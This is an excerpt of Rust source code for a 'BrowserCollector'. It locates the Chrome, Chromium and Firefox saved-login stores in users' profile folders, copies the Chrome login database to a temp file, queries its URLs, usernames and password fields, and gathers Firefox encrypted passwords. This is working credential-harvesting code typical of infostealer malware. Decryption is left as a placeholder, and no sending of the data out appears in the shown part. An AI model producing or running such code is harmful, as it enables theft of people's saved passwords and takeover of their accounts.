...
impl BrowserCollector {
    ...
    pub fn collect_chrome(&self) -> Option<Vec<BrowserCredential>> {
        ...
        if let Ok(profile) = env::var("USERPROFILE") {
            paths.push(PathBuf::from(&profile).join(r"AppData\Local\Google\Chrome\User Data\Default\Login Data"));
            paths.push(PathBuf::from(&profile).join(r"AppData\Local\Chromium\User Data\Default\Login Data"));
        }
        ...
        for path in paths {
            if path.exists() {
                ...
                let temp_path = env::temp_dir().join(format!("login_data_temp_{}.db", uuid::Uuid::new_v4()));
                if let Err(e) = fs::copy(&path, &temp_path) {
                    eprintln!("Failed to copy Chrome Login Data from {:?} to {:?}: {}", path, temp_path, e);
                    continue;
                }
                ...
                match Connection::open_with_flags(
                    ...
                    Ok(conn) => {
                        let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
                            Ok(s) => s,
                            Err(e) => {
                                eprintln!("Failed to prepare SQL statement for Chrome DB: {}", e);
                                let _ = fs::remove_file(&temp_path);
                                continue;
                            }
                        };
                        let creds_iter = match stmt.query_map([], |row| {
                            Ok(BrowserCredential {
                                url: row.get(0)?,
                                username: row.get(1)?,
                                // Password value is encrypted, return placeholder for now
                            ...
                            Ok(c) => c,
                            Err(e) => {
                                eprintln!("Failed to query Chrome DB: {}", e);
                                let _ = fs::remove_file(&temp_path);
                                continue;
                            }
                        };
        ...
        if collected_creds.is_empty() { None } else { Some(collected_creds) }
    }
    ...
    pub fn collect_firefox(&self) -> Option<Vec<BrowserCredential>> {
        ...
        for home in home_dirs.into_iter().flatten() {
            ...
            // Windows
            let win_profile = PathBuf::from(&home).join(r"AppData\Roaming\Mozilla\Firefox\Profiles");
                    ...
                    Ok(json_value) => {
                        if let Some(logins_array) = json_value["logins"].as_array() {
                            for login in logins_array {
                                ...
                                let encrypted_password = login["encryptedPassword"].as_str().unwrap_or("").to_string();

                                if !hostname.is_empty() && !username.is_empty() {
                                    collected_creds.push(BrowserCredential {
                                        url: hostname,
                                        username,
                                        password: Some(format!("[ENCRYPTED_FIREFOX_PASSWORD]: {}", encrypted_password)),
